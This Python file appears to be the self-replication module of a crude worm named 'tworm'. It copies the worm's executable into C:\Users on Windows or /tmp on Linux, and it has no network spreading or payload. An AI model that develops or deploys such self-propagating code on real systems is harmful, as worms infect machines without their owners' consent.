import shutil, platform


class replicate:

    def __init__(self,name, filepath="C:\\Users"):
        self.name = name
        if not filepath == None:
            self.data = open(name, 'rb')
        else:
            self.data = None


    def getfiledata(self):
        return self.data
    
    def self_replicate(self, target="windows", path="tworm.exe"):
        print("start")
        try:
            if "windows" in target.lower():
                self.replicate_on_windows(path)
            elif "linux" in target.lower():
                self.replicate_on_linux(path)
            else:
                print("replicate failed - platform unidentify")
        except Exception as e:
            print("replicate error: {}".format(e))
            
    def replicate_on_windows(self, source="tworm.exe", path_name="C:\\Users\\tworm.exe"):
        with open(source, 'rb') as file:
            with open(path_name, 'wb') as clone:
                clone.write(file.read())
        print("finished")
    
    def replicate_on_linux(self, source="tworm.elf", path_name="/tmp/tworm.elf"):
        with open(source, 'rb') as file:
                with open(path_name, 'wb') as clone:
                    clone.write(file.read())
        print("finished")